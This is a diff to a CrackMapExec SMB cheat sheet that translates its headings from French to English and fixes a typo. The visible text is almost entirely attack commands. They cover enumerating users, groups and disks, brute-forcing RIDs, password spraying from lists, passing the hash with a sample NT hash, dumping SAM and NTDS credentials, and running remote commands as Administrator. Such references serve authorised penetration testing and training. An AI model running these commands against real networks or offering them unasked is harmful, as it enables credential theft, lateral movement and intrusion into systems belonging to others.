@@ -20,27 +20,22 @@ Disk
 `cme smb 10.0.0.0 -u UserName -p 'PASS' --disks`
 
 Users
-=====
-Loggés
-------
+-----
+Logged
 `cme smb 192.168.1.0/24 -u UserName -p 'PASS' --loggedon-users`
 
-Du domaine
-----------
+Domain
 `cme smb 192.168.1.0/24 -u UserName -p 'PASS' --users`
 
 Via RID
--------
 `cme smb 192.168.1.0/24 -u UserName -p 'PASS' --rid-brute`
 
-Groupes
-=======
-Domaine
+Groups
 -------
+Domain
 `cme smb 10.0.0.0 -u UserName -p 'PASS' --groups`
 
 Local
------
 `cme smb 10.0.0.0 -u UserName -p 'PASS' --local-groups`
 
 Password Policy
@@ -55,9 +50,9 @@ User + pass
 
 User + hash
 -----------
-`#cme smb 192.168.1.0/24 -u UserNAme -H 'LM:NT'`
+`#cme smb 192.168.1.0/24 -u UserName -H 'LM:NT'`
 
-`#cme smb 192.168.1.0/24 -u UserNAme -H 'NTHASH'`
+`#cme smb 192.168.1.0/24 -u UserName -H 'NTHASH'`
 
 `cme smb 192.168.1.0/24 -u Administrator -H '13b29964cc2480b4ef454c59562e675c'`
 
@@ -67,7 +62,7 @@ Null session
 ------------
 `cme smb 192.168.1.0/24 -u '' -p ''`
 
-Listes
+Lists
 ------
 `cme smb 192.168.1.101 -u user1 user2 user3 -p Summer18`
 
@@ -78,25 +73,25 @@ Listes
 `cme smb 192.168.1.101 -u Administrator -p /path/to/passwords.txt`
 
 
-`#Pour continuer sur cette session après success`
+`#To continue on a session after success`
 
 `cme smb 192.168.1.101 -u /path/to/users.txt -p Summer18 --continue-on-success`
 
-En local
+Local
 --------
-`cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --local-auth`
+`cme smb 192.168.1.0/24 -u UserName -p 'PASS' --local-auth`
 
 `cme smb 192.168.1.0/24 -u '' -p '' --local-auth`
 
-`cme smb 192.168.1.0/24 -u UserNAme -H 'LM:NT' --local-auth`
+`cme smb 192.168.1.0/24 -u UserName -H 'LM:NT' --local-auth`
 
-`cme smb 192.168.1.0/24 -u UserNAme -H 'NTHASH' --local-auth`
+`cme smb 192.168.1.0/24 -u UserName -H 'NTHASH' --local-auth`
 
 `cme smb 192.168.1.0/24 -u localguy -H '13b29964cc2480b4ef454c59562e675c' --local-auth`
 
 `cme smb 192.168.1.0/24 -u localguy -H 'aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c' --local-auth`
 
-Obtenir des creds
+Get creds
 =================
 SAM
 ---
@@ -112,9 +107,9 @@ NTDS
 
 `cme smb 10.0.0.0 -u UserName -p 'PASS' --ntds vss #Via VSS`
 
-Exécution de commandes
+Command execution
 ======================
-Commandes + commandes Powershell
+Commands + Powershell commands
 --------------------------------
 `crackmapexec 10.0.0.0 -u Administrator -p 'P@ssw0rd' -x whoami`
 
